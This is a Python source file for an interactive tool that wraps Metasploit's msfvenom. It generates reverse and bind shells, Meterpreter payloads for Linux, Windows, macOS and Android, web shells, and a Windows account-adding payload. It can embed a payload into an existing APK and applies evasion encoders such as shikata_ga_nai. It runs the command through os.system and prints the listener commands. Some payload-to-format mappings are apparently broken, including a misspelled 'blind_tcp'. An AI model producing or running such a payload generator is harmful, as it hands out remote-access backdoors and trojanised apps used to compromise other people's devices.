import os


def main_menu():
    print("""
    **********************************************************************
    *                                                                    *
    *                          Main menu                                 *
    *                                                                    *
    **********************************************************************
    *                                                                    *
    * [1]   linux                                                        *
    * [2]   windows                                                      *
    * [3]   mac                                                          *
    * [4]   web payloads                                                 *
    * [5]   scripting                                                    *
    * [6]   android                                                      *
    * [7]   shellcode (raw)                                              *
    *                                                                    *
    **********************************************************************
    """)
    menu_result = int(input("[*] Enter your choice :- "))
    return menu_result - 1


def payload_selection(menu):
    if menu == "linux":
        print("""
        **********************************************************************
        *                                                                    *
        *                             Linux menu                             *
        *                                                                    *
        **********************************************************************
        *                                                                    *
        * [1]   Reverse shell                                                *
        * [2]   bind shell                                                   *
        *                                                                    *
        **********************************************************************
        """)
        linux_result = int(input("[*] Enter your choice :- "))
        return linux_result - 1, 1, '', ''
    elif menu == "windows":
        print("""
    **********************************************************************
    *                                                                    *
    *                            windows menu                            *
    *                                                                    *
    **********************************************************************
    *                                                                    *
    * [1]   Reverse shell                                                *
    * [2]   bind shell                                                   *
    * [3]   cmd shell                                                    *
    * [4]   user creation                                                *
    * [5]   Powershell Payload                                           *
    *                                                                    *
    **********************************************************************
    """)
        windows_result = int(input("[*] Enter your choice :- "))
        return windows_result - 1, 2, '', ''
    elif menu == "mac":
        print("""
    **********************************************************************
    *                                                                    *
    *                             Mac menu                               *
    *                                                                    *
    **********************************************************************
    *                                                                    *
    * [1]   Reverse shell                                                *
    * [2]   bind shell                                                   *
    *                                                                    *
    **********************************************************************
    """)
        mac_result = int(input("[*] Enter your choice :- "))
        return mac_result - 1, 3, '', ''
    elif menu == "webpayloads":
        print("""
    **********************************************************************
    *                                                                    *
    *                         web payloads menu                          *
    *                                                                    *
    **********************************************************************
    *                                                                    *
    * [1]   php                                                          *
    * [2]   asp                                                          *
    * [3]   jsp                                                          *
    * [4]   war                                                          *
    *                                                                    *
    **********************************************************************
    """)
        web_result = int(input("[*] Enter your choice :- "))
        return web_result - 1, 4, '', ''
    elif menu == "scripting":
        print("""
    **********************************************************************
    *                                                                    *
    *                             Scripting menu                         *
    *                                                                    *
    **********************************************************************
    *                                                                    *
    * [1]   python                                                       *
    * [2]   bash                                                         *
    * [3]   perl                                                         *
    * [4]   nodejs                                                       *
    *                                                                    *
    **********************************************************************
    """)
        script_result = int(input("[*] Enter your choice :- "))
        return script_result - 1, 5, '', ''
    elif menu == "android":
        print("""
    **********************************************************************
    *                                                                    *
    *                             Android menu                           *
    *                                                                    *
    **********************************************************************
    *                                                                    *
    * [1]   Reverse shell                                                *
    * [2]   Embed Payload with another apk                               *
    *                                                                    *
    **********************************************************************
    """)
        android_result = int(input("[*] Enter your choice(default is 1) :- ") or 1)
        apk_ap = apk_app(android_result)
        return android_result - 1, 6, '', apk_ap
    elif menu == "shellcode":
        print("""
    **********************************************************************
    *                                                                    *
    *                          shell code	                             *
    *                                                                    *
    **********************************************************************
    *                                                                    *
    * [1]   linux                                                        *
    * [2]   windows                                                      *
    * [3]   mac                                                          *
    *                                                                    *
    **********************************************************************
    """)
        shell_result = int(input("[*] Enter your choice :- "))
        format_key = ' ' + formats()
        return shell_result - 1, 7, format_key, ''


def formats():
    print("""
    +----------------------------------------+
    |          Executable formats            |
    +-----------+----------------+-----------+
    |    asp    |      aspx      |  aspx-exe |
    +-----------+----------------+-----------+
    |    dll    |       elf      |   elf-so  |
    +-----------+----------------+-----------+
    |  exe-only |   exe-service  | exe-small |
    +-----------+----------------+-----------+
    |    jar    |    loop-vbs    |   macho   |
    +-----------+----------------+-----------+
    | msi-nouac |     osx-app    |    psh    |
    +-----------+----------------+-----------+
    |  psh-net  | psh-reflection |    vba    |
    +-----------+----------------+-----------+
    |  vba-psh  |       vbs      |    war    |
    +-----------+----------------+-----------+
    |   axis2   |       exe      |  hta-psh  |
    +-----------+----------------+-----------+
    |    msi    |     psh-cmd    |  vba-exe  |
    +-----------+----------------+-----------+
    +----------------------------------+
    |         Transform formats        |  
    +---------------+-------+----------+
    |      bash     |   c   |  csharp  |
    +---------------+-------+----------+
    |       dw      | dword |    hex   |
    +---------------+-------+----------+
    |      java     | js_be |   js_le  |
    +---------------+-------+----------+
    |      num      |  perl |    pl    |
    +---------------+-------+----------+
    |   powershell  |  ps1  |    py    |
    +---------------+-------+----------+
    |     python    |  raw  |    rb    |
    +---------------+-------+----------+
    |      ruby     |   sh  | vbscript |
    +---------------+-------+----------+
    |            vbapplication         |
    +---------------+-------+----------+
    """)
    format_key = str(input("[+] Enter the format you want(eg:- sh) :- "))
    return format_key


def apk_app(android_result):
    if android_result == 2:
        apk_a = str(input("[+] Enter the apk location or drag and drop apk file :- "))
        return "-x " + apk_a
    else:
        return ''


def encoder():
    print("""
    +----------------------------------+-----------+--------------------------------------------------------+
    |       Name                       |   Rank    |      Description                                       |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 1) cmd/brace                     | low       | Bash Brace Expansion Command Encoder                   |
    | 2) cmd/echo                      | good      | Echo Command Encoder                                   |
    | 3) cmd/generic_sh                | manual    |  Generic Shell Variable Substitution Command Encoder   |
    | 4) cmd/ifs                       | low       | Generic (IFS)  Substitution Command Encoder            |
    | 5) cmd/perl                      | normal    |  Perl Command Encoder                                  |
    | 6) cmd/powershell_base64         | excellent | Powershell Base64 Command Encoder                      |
    | 7) cmd/printf_php_mq             | manual    | printf(1) via PHP magic_quotes Utility Command Encoder |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 8) generic/eicar                 | manual    | The EICAR Encoder                                      |
    | 9) generic/none                  | normal    | The "none" Encoder                                     |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 10) mipsbe/byte_xori             | normal    | Byte XORi Encoder                                      |
    | 11) mipsbe/longxor               | normal    | XOR Encoder                                            |
    | 12) mipsle/byte_xori             | normal    | Byte XORi Encoder                                      |
    | 13) mipsle/longxor               | normal    | XOR Encoder                                            |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 14) php/base64                   | great     | PHP Base64 Encoder                                     |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 15) ppc/longxor                  | normal    | PPC LongXOR Encoder                                    |
    | 16) ppc/longxor_tag              | normal    | PPC LongXOR Encoder                                    |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 17) ruby/base64                  | great     | Ruby Base64 Encoder                                    |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 18) sparc/longxor_tag            | normal    | SPARC DWORD XOR Encoder                                |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 19) x64/xor                      | normal    | XOR Encoder                                            |
    | 20) x64/xor_dynamic              | normal    | Dynamic key XOR Encoder                                |
    | 21) x64/zutto_dekiru             | manual    | Zutto Dekiru                                           |
    +----------------------------------+-----------+--------------------------------------------------------+
    | 22) x86/add_sub                  | manual    | Add/Sub Encoder                                        |
    | 23) x86/alpha_mixed              | low       | Alpha2 Alphanumeric Mixedcase Encoder                  |
    | 24) x86/alpha_upper              | low       | Alpha2 Alphanumeric Uppercase Encoder                  |
    | 25) x86/avoid_underscore_tolower | manual    | Avoid underscore/tolower                               |
    | 26) x86/avoid_utf8_tolower       | manual    | Avoid UTF8/tolower                                     |
    | 27) x86/bloxor                   | manual    | BloXor - A Metamorphic Block Based XOR Encoder         |
    | 28) x86/bmp_polyglot             | manual    | BMP Polyglot                                           |
    | 29) x86/call4_dword_xor          | normal    | Call+4 Dword XOR Encoder                               |
    | 30) x86/context_cpuid            | manual    | CPUID-based Context Keyed Payload Encoder              |
    | 31) x86/context_stat             | manual    | stat(2)-based Context Keyed Payload Encoder            |
    | 32) x86/context_time             | manual    | time(2)-based Context Keyed Payload Encoder            |
    | 33) x86/countdown                | normal    | Single-byte XOR Countdown Encoder                      |
    | 34) x86/fnstenv_mov              | normal    |  Variable-length Fnstenv/mov Dword XOR Encoder         |
    | 35) x86/jmp_call_additive        | normal    | Jump/Call XOR Additive Feedback Encoder                |
    | 36) x86/nonalpha                 | low       | Non-Alpha Encoder                                      |
    | 37) x86/nonupper                 | low       | Non-Upper Encoder                                      |
    | 38) x86/opt_sub                  | manual    | Sub Encoder (optimised)                                |
    | 39) x86/service                  | manual    | Register Service                                       |
    | 40) x86/shikata_ga_nai           | excellent | Polymorphic XOR Additive Feedback Encoder              |
    | 41) x86/single_static_bit        | manual    | Single Static Bit                                      |
    | 42) x86/unicode_mixed            | manual    | Alpha2 Alphanumeric Unicode Mixedcase Encoder          |
    | 43) x86/unicode_upper            | manual    | Alpha2 Alphanumeric Unicode Uppercase Encoder          |
    | 44) x86/xor_dynamic              | noraml    | Dynamic key XOR Encoder                                |
    +----------------------------------+-----------+--------------------------------------------------------+
    """)
    encode_result = int(input("[*] Enter your choice(Default[generic/none])  :- ") or 9)
    encoder_iteration = int(input("[*] Enter your choice(Default is 1)  :- ") or 1)
    return encode_result - 1, encoder_iteration


def ending(payload, lhost, lport):
    credit()
    print("*" * 40)
    print("copy the following code and paste in metasploit for listening")
    print("*" * 40)
    print("use exploit/multi/handler")
    print("set PAYLOAD " + payload)
    print("set LHOST " + lhost)
    print("set LPORT " + lport)
    print("set ExitOnSession false")
    print("exploit -j")


def user_selection(payload, encode_result, lhost, lport, platform):
    credit()
    print("*" * 40)
    print("ip               : " + lhost)
    print("port             : " + lport)
    print("platform         : " + platform)
    print("payload          : " + payload.split(" ")[-1])
    print("encoder          : " + encode_select[encode_result])
    print("*" * 40)


def credit():
    print("""
            MSFVENOM AUTOMATIC CODE GENERATOR
            """)
    print("""
    
     ██▀███   ▄▄▄       ██░ ██  █    ██  ██▓    
    ▓██ ▒ ██▒▒████▄    ▓██░ ██▒ ██  ▓██▒▓██▒    
    ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▀▀██░▓██  ▒██░▒██░    
    ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█ ░██ ▓▓█  ░██░▒██░    
    ░██▓ ▒██▒ ▓█   ▓██▒░▓█▒░██▓▒▒█████▓ ░██████▒
    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░
      ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░▒░ ░░░▒░ ░ ░ ░ ░ ▒  ░
      ░░   ░   ░   ▒    ░  ░░ ░ ░░░ ░ ░   ░ ░   
       ░           ░  ░ ░  ░  ░   ░         ░  ░ code generated by Rahul.p

    """)
    print("# This tool will generate automatic code of MSFvenom by RAPID7 #")
    print("** MAXIMISE YOUR CONSOLE SCREEN FOR BETTER RESULTS**")


def ipaddress():
    lhost = input("[+] Enter ip-address(Default is eth0) :- ") or 'eth0'
    lport = input("[+] Enter port address(Default is 1234) :- ") or '1234'
    return lhost, lport


def output(payload, encode_result, iteration, lhost, lport, format_extension):
    os.system(
        f'msfvenom  {payload} -e {encode_select[encode_result]} -i {iteration} LHOST={lhost} LPORT={lport} {format_extension}')


def main():
    result = main_menu()
    payload, opt, format_key, apk_file = payload_selection(menu[result])
    format_extension = apk_file + format_ext.get(opt)[payload] + format_key
    payload = menu_payloads.get(opt)[payload]
    lhost, lport = ipaddress()
    encode_result, iteration = encoder()
    user_selection(payload, encode_result, lhost, lport, menu[result])
    output(payload, encode_result, iteration, lhost, lport, format_extension)
    ending(payload, lhost, lport)


menu = ("linux", "windows", "mac", "webpayloads", "scripting", "android", "shellcode")
menu_payloads = {1: ("-p linux/x86/meterpreter/reverse_tcp", "-p linux/x86/meterpreter/bind_tcp"),
                 2: ("-p windows/meterpreter/reverse_tcp", "-p windows/meterpreter/blind_tcp",
                     "-p windows/shell/reverse_tcp ", "-p windows/adduser", "-p cmd/windows/reverse_powershell"),
                 3: ("-p osx/x86/shell_reverse_tcp", "-p osx/x86/shell_bind_tcp"),
                 4: ("-p php/meterpreter_reverse_tcp", "-p windows/meterpreter/reverse_tcp",
                     "-p java/jsp_shell_reverse_tcp",
                     "-p java/jsp_shell_reverse_tcp"),
                 5: ("-p cmd/unix/reverse_python", "-p cmd/unix/reverse_bash", "-p cmd/unix/reverse_perl",
                     "-p nodejs/shell_reverse_tcp"),
                 6: ("-p android/meterpreter/reverse_tcp", "-p android/meterpreter/reverse_tcp"),
                 7: ("-p linux/x86/meterpreter/reverse_tcp", "-p windows/meterpreter/reverse_tcp",
                     "-p osx/x86/shell_reverse_tcp")}
encode_select = ('cmd/brace', 'cmd/echo', 'cmd/generic_sh', 'cmd/ifs', 'cmd/perl',
                 'cmd/powershell_base64', 'cmd/printf_php_mq', 'generic/eicar', 'generic/none',
                 'mipsbe/byte_xori', 'mipsbe/longxor', 'mipsle/byte_xori', 'mipsle/longxor', 'php/base64',
                 'ppc/longxor', 'ppc/longxor_tag', 'ruby/base64', 'sparc/longxor_tag', 'x64/xor', 'x64/xor_dynamic',
                 'x64/zutto_dekiru', 'x86/add_sub', 'x86/alpha_mixed', 'x86/alpha_upper',
                 'x86/avoid_underscore_tolower', 'x86/avoid_utf8_tolower', 'x86/bloxor',
                 'x86/bmp_polyglot', 'x86/call4_dword_xor', 'x86/context_cpuid', 'x86/context_stat',
                 'x86/context_time', 'x86/countdown', 'x86/fnstenv_mov', 'x86/jmp_call_additive',
                 'x86/nonalpha', 'x86/nonupper', 'x86/opt_sub', 'x86/service', 'x86/shikata_ga_nai',
                 'x86/single_static_bit', 'x86/unicode_mixed', 'x86/unicode_upper', 'x86/xor_dynamic')
format_ext = {
    1: ("-f elf > shell.elf", "-f elf > shell.elf"),
    2: ("-f exe > shell.exe", "-f exe > shell.exe", "-f exe > shell.exe", "-f exe > shell.exe", " > shell.bat"),
    3: ("-f macho > shell.macho", "-f macho > shell.macho"),
    4: ("-f raw > shell.php", "-f asp > shell.asp", "-f asp > shell.jsp", "-f asp > shell.war"),
    5: ("-f raw > shell.py", "-f raw > shell.sh", "-f raw > shell.pl", "-f raw > shell.js"),
    6: ("R > shell.apk", " R > shell.apk"),
    7: ("-f", "-f", "-f")
}
try:
    credit()
    main()
except KeyboardInterrupt:
    print("[-] Exiting .....")
except ValueError:
    print("[-] Enter correct value")
    main()
